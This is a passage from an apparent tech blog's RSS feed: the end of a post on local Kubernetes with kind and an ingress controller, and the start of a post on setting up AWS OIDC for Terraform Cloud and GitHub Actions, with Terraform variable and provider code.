<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #8DDB8C">http</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">paths</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">path</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">/httpbin(/|$)(.*)</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">pathType</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">ImplementationSpecific</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">backend</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">service</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">httpbin</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #8DDB8C">port</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">              </span><span style="color: #8DDB8C">number</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">8000</span></span></code></pre></div>
<p>There are a few critical options here.  The first is the annotation to rewrite
the path so it doesn't include <code>/httpbin/</code> when it sends the request to the
service and then the <code>path</code> and <code>pathType</code> so it knows which paths to send to
which service.</p>
<p>Now you should be able to hit your local host and get routed to your
kubernetes service:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">localhost/httpbin/get</span></span></code></pre></div>
<p>Success!  Now you have a multinode kubernetes cluster that has an ingress
controller!</p>
<h1>Next Steps</h1>
<p>The cluster can be used like a production cluster now for local
development!  You could setup Grafana, ArgoCD, etc. to run
inside the cluster.</p>]]></description>
            <link>https://sontek.net/blog/2023/local_k8s_with_kind</link>
            <guid isPermaLink="true">https://sontek.net/blog/2023/local_k8s_with_kind</guid>
            <pubDate>Fri, 21 Jul 2023 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[AWS From Scratch with Terraform - Setting up your Root Account for IaC  with Terraform Cloud and Github actions.]]></title>
            <description><![CDATA[<p>Following this article will get you setup with an AWS Root account that can be
managed through through Terraform Cloud with OIDC and github actions. As a best practice you
should not keep long-lived access keys in your CI/CD pipelines when
deploying to AWS, instead you should use OIDC (OpenID Connect) to securely
deploy to AWS when using Terraform Cloud or Github Actions.</p>
<iframe width="854" height="480" src="https://www.youtube.com/embed/3oZd1m8_KIo" title="AWS From Scratch - Preparing your account to be managed by IaC via Terraform and Github Actions" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture;web-share" allowfullscreen></iframe>
<h1>TL;DR</h1>
<p>Download all the terraform from the blog post here:</p>
<ul>
<li><a href="https://github.com/sontek/aws-apply-before-merge">https://github.com/sontek/aws-apply-before-merge</a></li>
<li><a href="https://github.com/sontek/aws-terraform-github-actions">https://github.com/sontek/aws-terraform-github-actions</a></li>
</ul>
<h1>How does OIDC work</h1>
<p>OIDC enables us to request a short-lived access token directly from AWS. We
just have to create trust relationship that controls which workflows are able
to request the access tokens.</p>
<ul>
<li>No need to duplicate AWS credentials as long-lived GitHub secrets.</li>
<li>Since we are using a short-lived access token that is only valid for a single
job there is no reason to worry about rotating secrets.</li>
</ul>
<p>The following diagram gives an overview of how we can use Terraform Cloud's
OIDC provider to integrate with AWS:</p>
<div class="remark-mermaid remark-mermaid-default"><svg aria-roledescription="flowchart-v2" role="graphics-document document" viewBox="-8 -8 843.078125 320" style="max-width: 843.078px; background-color: transparent;" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg" width="100%" id="my-svg"><style>#my-svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;fill:#333;}#my-svg .error-icon{fill:#552222;}#my-svg .error-text{fill:#552222;stroke:#552222;}#my-svg .edge-thickness-normal{stroke-width:2px;}#my-svg .edge-thickness-thick{stroke-width:3.5px;}#my-svg .edge-pattern-solid{stroke-dasharray:0;}#my-svg .edge-pattern-dashed{stroke-dasharray:3;}#my-svg .edge-pattern-dotted{stroke-dasharray:2;}#my-svg .marker{fill:#333333;stroke:#333333;}#my-svg .marker.cross{stroke:#333333;}#my-svg svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;}#my-svg .label{font-family:"trebuchet ms",verdana,arial,sans-serif;color:#333;}#my-svg .cluster-label text{fill:#333;}#my-svg .cluster-label span,#my-svg p{color:#333;}#my-svg .label text,#my-svg span,#my-svg p{fill:#333;color:#333;}#my-svg .node rect,#my-svg .node circle,#my-svg .node ellipse,#my-svg .node polygon,#my-svg .node path{fill:#ECECFF;stroke:#9370DB;stroke-width:1px;}#my-svg .flowchart-label text{text-anchor:middle;}#my-svg .node .label{text-align:center;}#my-svg .node.clickable{cursor:pointer;}#my-svg .arrowheadPath{fill:#333333;}#my-svg .edgePath .path{stroke:#333333;stroke-width:2.0px;}#my-svg .flowchart-link{stroke:#333333;fill:none;}#my-svg .edgeLabel{background-color:#e8e8e8;text-align:center;}#my-svg .edgeLabel rect{opacity:0.5;background-color:#e8e8e8;fill:#e8e8e8;}#my-svg .labelBkg{background-color:rgba(232, 232, 232, 0.5);}#my-svg .cluster rect{fill:#ffffde;stroke:#aaaa33;stroke-width:1px;}#my-svg .cluster text{fill:#333;}#my-svg .cluster span,#my-svg p{color:#333;}#my-svg div.mermaidTooltip{position:absolute;text-align:center;max-width:200px;padding:2px;font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:12px;background:hsl(80, 100%, 96.2745098039%);border:1px solid #aaaa33;border-radius:2px;pointer-events:none;z-index:100;}#my-svg .flowchartTitleText{text-anchor:middle;font-size:18px;fill:#333;}#my-svg :root{--mermaid-font-family:"trebuchet ms",verdana,arial,sans-serif;}</style><g><marker orient="auto" markerHeight="12" markerWidth="12" markerUnits="userSpaceOnUse" refY="5" refX="6" viewBox="0 0 10 10" class="marker flowchart" id="my-svg_flowchart-pointEnd"><path style="stroke-width: 1; stroke-dasharray: 1, 0;" class="arrowMarkerPath" d="M 0 0 L 10 5 L 0 10 z"></path></marker><marker orient="auto" markerHeight="12" markerWidth="12" markerUnits="userSpaceOnUse" refY="5" refX="4.5" viewBox="0 0 10 10" class="marker flowchart" id="my-svg_flowchart-pointStart"><path style="stroke-width: 1; stroke-dasharray: 1, 0;" class="arrowMarkerPath" d="M 0 5 L 10 10 L 10 0 z"></path></marker><marker orient="auto" markerHeight="11" markerWidth="11" markerUnits="userSpaceOnUse" refY="5" refX="11" viewBox="0 0 10 10" class="marker flowchart" id="my-svg_flowchart-circleEnd"><circle style="stroke-width: 1; stroke-dasharray: 1, 0;" class="arrowMarkerPath" r="5" cy="5" cx="5"></circle></marker><marker orient="auto" markerHeight="11" markerWidth="11" markerUnits="userSpaceOnUse" refY="5" refX="-1" viewBox="0 0 10 10" class="marker flowchart" id="my-svg_flowchart-circleStart"><circle style="stroke-width: 1; stroke-dasharray: 1, 0;" class="arrowMarkerPath" r="5" cy="5" cx="5"></circle></marker><marker orient="auto" markerHeight="11" markerWidth="11" markerUnits="userSpaceOnUse" refY="5.2" refX="12" viewBox="0 0 11 11" class="marker cross flowchart" id="my-svg_flowchart-crossEnd"><path style="stroke-width: 2; stroke-dasharray: 1, 0;" class="arrowMarkerPath" d="M 1,1 l 9,9 M 10,1 l -9,9"></path></marker><marker orient="auto" markerHeight="11" markerWidth="11" markerUnits="userSpaceOnUse" refY="5.2" refX="-1" viewBox="0 0 11 11" class="marker cross flowchart" id="my-svg_flowchart-crossStart"><path style="stroke-width: 2; stroke-dasharray: 1, 0;" class="arrowMarkerPath" d="M 1,1 l 9,9 M 10,1 l -9,9"></path></marker><g class="root"><g class="clusters"></g><g class="edgePaths"><path marker-end="url(#my-svg_flowchart-pointEnd)" style="fill:none;" class="edge-thickness-normal edge-pattern-solid flowchart-link LS-AWS LE-Token" id="L-AWS-Token-0" d="M185.671875,134.5L181.50520833333334,134.5C177.33854166666666,134.5,169.00520833333334,134.5,153.0306361743634,145.2794461651524C137.05606401539345,156.0588923303048,113.4402530307869,177.61778466060957,101.63234753848364,188.39723082576197L89.82444204618037,199.17667699091436"></path><path marker-end="url(#my-svg_flowchart-pointEnd)" style="fill:none;" class="edge-thickness-normal edge-pattern-solid flowchart-link LS-Token LE-Terraform" id="L-Token-Terraform-0" d="M85.91019081858407,235.75L98.37047151548673,247.125C110.83075221238937,258.5,135.75131360619469,281.25,164.46289638643069,292.625C193.17447916666666,304,225.67708333333334,304,258.1796875,304C290.6822916666667,304,323.1848958333333,304,359.3528645833333,304C395.5208333333333,304,435.3541666666667,304,475.1875,304C515.0208333333334,304,554.8541666666666,304,584.9583299079444,297.2781483582884C615.0624931492222,290.55629671657675,635.4374862984442,277.1125934331535,645.6249828730553,270.3907417914419L655.8124794476664,263.66889014973026"></path><path marker-end="url(#my-svg_flowchart-pointEnd)" style="fill:none;" class="edge-thickness-normal edge-pattern-solid flowchart-link LS-Terraform LE-JWT" id="L-Terraform-JWT-0" d="M660.2362877949853,177.75L649.3114898291544,170.54166666666666C638.3866918633236,163.33333333333334,616.5370959316618,148.91666666666666,602.3289646324976,141.70833333333334C588.1208333333333,134.5,581.5541666666667,134.5,578.2708333333334,134.5L574.9875,134.5"></path><path marker-end="url(#my-svg_flowchart-pointEnd)" style="fill:none;" class="edge-thickness-normal edge-pattern-solid flowchart-link LS-JWT LE-AWS" id="L-JWT-AWS-0" d="M380.6875,134.5L376.5208333333333,134.5C372.3541666666667,134.5,364.0208333333333,134.5,356.5708333333334,134.5C349.12083333333334,134.5,342.5541666666666,134.5,339.2708333333333,134.5L335.9875,134.5"></path></g><g class="edgeLabels"><g class="edgeLabel"><g transform="translate(0, 0)" class="label"><foreignObject height="0" width="0"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="edgeLabel"></span></div></foreignObject></g></g><g class="edgeLabel"><g transform="translate(0, 0)" class="label"><foreignObject height="0" width="0"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="edgeLabel"></span></div></foreignObject></g></g><g class="edgeLabel"><g transform="translate(0, 0)" class="label"><foreignObject height="0" width="0"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="edgeLabel"></span></div></foreignObject></g></g><g class="edgeLabel"><g transform="translate(0, 0)" class="label"><foreignObject height="0" width="0"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="edgeLabel"></span></div></foreignObject></g></g></g><g class="nodes"><g transform="translate(621.1171875, 169.75)" class="root"><g class="clusters"><g id="Terraform" class="cluster default flowchart-label"><rect height="83" width="206.890625" y="8" x="-0.9296875" ry="0" rx="0" style=""></rect><g transform="translate(-0.9296875, 8)" class="cluster-label"><foreignObject height="18" width="206.890625"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Terraform Cloud Workflow #2</span></div></foreignObject></g></g></g><g class="edgePaths"></g><g class="edgeLabels"></g><g class="nodes"><g transform="translate(102.515625, 49.5)" id="flowchart-OIDCProvider-3" class="node default default flowchart-label"><rect height="33" width="119.03125" y="-16.5" x="-59.515625" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-52.015625, -9)" style="" class="label"><rect></rect><foreignObject height="18" width="104.03125"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">OIDC Provider</span></div></foreignObject></g></g></g></g><g transform="translate(178.171875, -8)" class="root"><g class="clusters"><g id="AWS" class="cluster default flowchart-label"><rect height="269" width="145.015625" y="8" x="8" ry="0" rx="0" style=""></rect><g transform="translate(51.4609375, 8)" class="cluster-label"><foreignObject height="18" width="58.09375"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">AWS #1</span></div></foreignObject></g></g></g><g class="edgePaths"></g><g class="edgeLabels"></g><g class="nodes"><g transform="translate(80.5078125, 59.5)" id="flowchart-OIDC-0" class="node default default flowchart-label"><rect height="33" width="95.015625" y="-16.5" x="-47.5078125" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-40.0078125, -9)" style="" class="label"><rect></rect><foreignObject height="18" width="80.015625"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">OIDC Trust</span></div></foreignObject></g></g><g transform="translate(80.5078125, 142.5)" id="flowchart-Roles-1" class="node default default flowchart-label"><rect height="33" width="55.90625" y="-16.5" x="-27.953125" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-20.453125, -9)" style="" class="label"><rect></rect><foreignObject height="18" width="40.90625"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Roles</span></div></foreignObject></g></g><g transform="translate(80.5078125, 225.5)" id="flowchart-Resources-2" class="node default default flowchart-label"><rect height="33" width="91.484375" y="-16.5" x="-45.7421875" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-38.2421875, -9)" style="" class="label"><rect></rect><foreignObject height="18" width="76.484375"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Resources</span></div></foreignObject></g></g></g></g><g transform="translate(67.8359375, 219.25)" id="flowchart-Token-5" class="node default default flowchart-label"><rect height="33" width="135.671875" y="-16.5" x="-67.8359375" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-60.3359375, -9)" style="" class="label"><rect></rect><foreignObject height="18" width="120.671875"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Access Token #4</span></div></foreignObject></g></g><g transform="translate(475.1875, 134.5)" id="flowchart-JWT-8" class="node default default flowchart-label"><rect height="33" width="189" y="-16.5" x="-94.5" ry="0" rx="0" style="" class="basic label-container"></rect><g transform="translate(-87, -9)" style="" class="label"><rect></rect><foreignObject height="18" width="174"><div style="display: inline-block; white-space: nowrap;" xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">JWT &#x26; Cloud Role ID #3</span></div></foreignObject></g></g></g></g></g></svg></div>
<ol>
<li>In AWS, create an OIDC trust between a role and our terraform cloud
workflow(s) that need access to the cloud.</li>
<li>Every time a job runs, TFC's OIDC Provider auto-generates an OIDC token.
This token contains multiple claims to establish a security-hardened and
verifiable identity about the specific workflow that is trying to authenticate.</li>
<li>Request this token from TFC's OIDC provider, and present it to AWS</li>
<li>Once AWS successfully validates the claims presented in the token, it then
provides a short-lived cloud access token that is available only for the duration
of the job.</li>
</ol>
<h1>What does this post accomplish</h1>
<ul>
<li>Setup a root AWS account that is managed througuh terraform</li>
<li>Setup OIDC authentication with Terraform Cloud so it can talk to AWS</li>
<li>Setup Github Actions authentication with Terraform Cloud so we can run plan
and apply through the CI/CD pipeline.</li>
</ul>
<h1>Setup AWS Access</h1>
<p>It is very bad practice to use the root account for much of anything but for
bootstrapping the account it is necessary, so the first step is to get your
<code>AWS_ACCESS_KEY_ID</code> and <code>AWS_SECRET_ACCESS_KEY</code></p>
<p>To do this click your account and choose <code>Security Credentials</code> in the top
right:</p>
<center>
<img src="/images/posts/aws_root_account/security_credentials.png" height="200">
</center>
<p>Then choose <code>Create Access key</code>:</p>
<center>
<img src="/images/posts/aws_root_account/create_access_token.png" width="200">
</center>
<p>You need to set these environment variables in your shell so that your local
shell has access to AWS. After you set them you can verify you set them correct
by running:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get-caller-identity</span></span></code></pre></div>
<p>and you should get a result similar to:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="json" data-theme="default"><code data-language="json" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">"UserId"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"777777777777"</span><span style="color: #ADBAC7">,</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">"Account"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"888888888888"</span><span style="color: #ADBAC7">,</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">"Arn"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"arn:aws:iam::888888888888:root"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<h2>Bootstrap</h2>
<p>Before you can manage any of your accounts through Terraform Cloud you'll need
bootstrap some core infrastructure like OIDC so Terraform Cloud can authenticate
securely and manage AWS Resources on your behalf.</p>
<p>I personally prefer doing this in two repositories:</p>
<ul>
<li>
<p><code>infra-bootstrap</code>: This repository does the bare minimum to hook up terraform
cloud with your AWS account and stores the state in git.  Its the only infra
that will not be controlled by your CI/CD pipeline.ccccccug</p>
</li>
<li>
<p><code>infra</code>: The actual repository where all the rest of your AWS resources are
managed.  It will store state in Terraform Cloud and you can introduce a
CI/CD pipeline for approving changes.</p>
<p><strong>Note</strong>: This repository will be generated with the terraform code.</p>
</li>
</ul>
<p>After manually creating the git repository <code>infra-boostrap</code> in your Github
account We will need 3 providers to bootstrap the account <code>aws</code>, <code>github</code>, and
<code>tfe</code>.</p>
<h3>Variables</h3>
<p>Create a <code>1-variables.tf</code> where we can define the variables we'll need
for creating these resources.</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="hcl" data-theme="default"><code data-language="hcl" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">variable</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc_aws_audience"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  type</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #F47067">string</span></span>
<span data-line=""><span style="color: #ADBAC7">  default</span><span style="color: #F69D50">     </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"aws.workload.identity"</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"The audience value to use in run identity tokens"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">variable</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc_hostname"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  type</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #F47067">string</span></span>
<span data-line=""><span style="color: #ADBAC7">  default</span><span style="color: #F69D50">     </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"app.terraform.io"</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"The hostname of the TFC or TFE instance you'd like to use with AWS"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">variable</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc_project_name"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  type</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #F47067">string</span></span>
<span data-line=""><span style="color: #ADBAC7">  default</span><span style="color: #F69D50">     </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"Default Project"</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"The project under which a workspace will be created"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">variable</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc_organization_name"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  type</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #F47067">string</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"The name of your Terraform Cloud organization"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">variable</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc_organization_owner"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  type</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #F47067">string</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"The owner of the TFC organization"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">variable</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"tfc_workspaces"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  type</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #F47067">list</span><span style="color: #ADBAC7">(</span><span style="color: #F47067">string</span><span style="color: #ADBAC7">)</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"The list of TFC workspaces"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">variable</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"github_organization"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"The organization the repositories are owned by"</span></span>
<span data-line=""><span style="color: #ADBAC7">  type</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #F47067">string</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">variable</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"github_repo_name"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"The name of the git reppository we'll create for managing infra"</span></span>
<span data-line=""><span style="color: #ADBAC7">  type</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #F47067">string</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">variable</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"github_default_branch"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"The default branch to utilize"</span></span>
<span data-line=""><span style="color: #ADBAC7">  type</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #F47067">string</span></span>
<span data-line=""><span style="color: #ADBAC7">  default</span><span style="color: #F69D50">     </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"main"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">variable</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"aws_root_account_id"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  description</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"The AWS root account we want to apply these changes to"</span></span>
<span data-line=""><span style="color: #ADBAC7">  type</span><span style="color: #F69D50">        </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #F47067">string</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>We will use these variables in the later modules but they are mostly metadata
around the terraform and github accounts you'll need to setup manually.</p>
<h3>Providers</h3>
<p>Create a file called <code>2-providers.tf</code> and define the providers:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="hcl" data-theme="default"><code data-language="hcl" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">terraform</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">required_providers</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">    tfe</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">      source  </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"hashicorp/tfe"</span></span>
<span data-line=""><span style="color: #ADBAC7">      version </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"0.41.0"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">    aws</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">      source  </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"hashicorp/aws"</span></span>
<span data-line=""><span style="color: #ADBAC7">      version </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"4.58.0"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">    github</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">      source  </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"integrations/github"</span></span>
<span data-line=""><span style="color: #ADBAC7">      version </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"5.18.3"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">provider</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"aws"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  region</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #96D0FF">"us-east-1"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #768390"># Root account, all other accounts should be provisioned</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #768390"># via pull requests</span></span>
<span data-line=""><span style="color: #ADBAC7">  allowed_account_ids</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">[var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">aws_root_account_id]</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">provider</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">"github"</span><span style="color: #ADBAC7"> {</span></span>
<span data-line=""><span style="color: #ADBAC7">  owner</span><span style="color: #F69D50"> </span><span style="color: #F47067">=</span><span style="color: #F69D50"> </span><span style="color: #ADBAC7">var</span><span style="color: #F47067">.</span><span style="color: #ADBAC7">github_organization</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>The key things there are we define <code>allowed_account_ids</code> to prevent us from
working against any account that isn't the root and we are using one of the
variables we defines earlier.</p>
<h3>Github</h3>
<p>We will utilize <code>terraform</code> to create the second git repository where the rest
